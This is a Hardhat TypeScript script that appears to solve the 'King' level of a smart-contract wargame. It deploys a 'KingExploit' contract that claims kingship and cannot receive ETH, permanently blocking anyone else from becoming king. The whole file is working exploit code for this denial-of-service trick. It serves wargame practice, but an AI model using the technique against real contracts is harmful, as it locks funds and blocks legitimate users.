import { ethers } from "hardhat";

/**
 * Claims the throne by deploying a KingExploit contract that becomes the king
 * but can't receive ETH, making it impossible for anyone else to become king.
 * 
 * Usage: 
 * npx hardhat run scripts/level-09-king/claim-throne.ts --network localhost
 * CONTRACT_ADDRESS=0xYourAddress npx hardhat run scripts/level-09-king/claim-throne.ts --network sepolia
 */
async function main() {
  // Get contract address from environment variable or use default
  const defaultAddress = "0xD404840fEB422d46BD63Cf2Cd748A488e78Ec390"; // Replace with your actual default address
  const contractAddress = process.env.CONTRACT_ADDRESS || defaultAddress;
  
  console.log(`Using King contract address: ${contractAddress}`);
  
  // Define a minimal ABI for the King contract
  const kingABI = [
    "function prize() view returns (uint256)",
    "function _king() view returns (address)",
    "function owner() view returns (address)",
  ];
  
  // Create a contract instance using the minimal ABI
  const kingContract = new ethers.Contract(contractAddress, kingABI, ethers.provider);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check current state
    console.log("Checking current state...");
    const currentPrize = await kingContract.prize();
    const currentKing = await kingContract._king();
    const owner = await kingContract.owner();
    
    console.log(`Current king: ${currentKing}`);
    console.log(`Current prize: ${ethers.formatEther(currentPrize)} ETH`);
    console.log(`Owner: ${owner}`);
    
    if (currentKing === deployer.address) {
      console.log("You are already the king! No need to proceed further.");
      return;
    }
    
    // Deploy the KingExploit contract
    console.log("Deploying KingExploit contract...");
    const KingExploit = await ethers.getContractFactory("KingExploit");
    
    // Deploy KingExploit contract with the King contract address
    const kingExploit = await KingExploit.deploy(contractAddress);
    await kingExploit.waitForDeployment();
    
    const exploitAddress = await kingExploit.getAddress();
    console.log(`KingExploit deployed at: ${exploitAddress}`);
    
    // Calculate the amount needed to claim the throne (current prize + a small buffer)
    const prizeToSend = currentPrize + ethers.parseEther("0.01");
    
    // Claim the throne
    console.log(`Claiming throne with ${ethers.formatEther(prizeToSend)} ETH...`);
    const tx = await kingExploit.getFunction("claimThrone")({ value: prizeToSend });
    
    // Wait for the transaction to be mined
    console.log("Waiting for transaction to be mined...");
    const receipt = await tx.wait();
    
    // Check if the exploit worked
    console.log("Checking if exploit worked...");
    const newKing = await kingContract._king();
    
    if (newKing === exploitAddress) {
      console.log("\nExploit successful! KingExploit contract is now the king.");
      console.log("Since the KingExploit contract can't receive ETH, no one can become king anymore.");
    } else {
      console.log("\nExploit failed. KingExploit contract did not become king.");
    }
    
    // Make sure receipt is not null before accessing its properties
    if (receipt) {
      console.log(`\nTransaction details:`);
      console.log(`Hash: ${receipt.hash}`);
      console.log(`Gas used: ${receipt.gasUsed.toString()}`);
      console.log(`Block number: ${receipt.blockNumber}`);
    }
  } catch (error) {
    console.error("\nError executing exploit:", error);
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
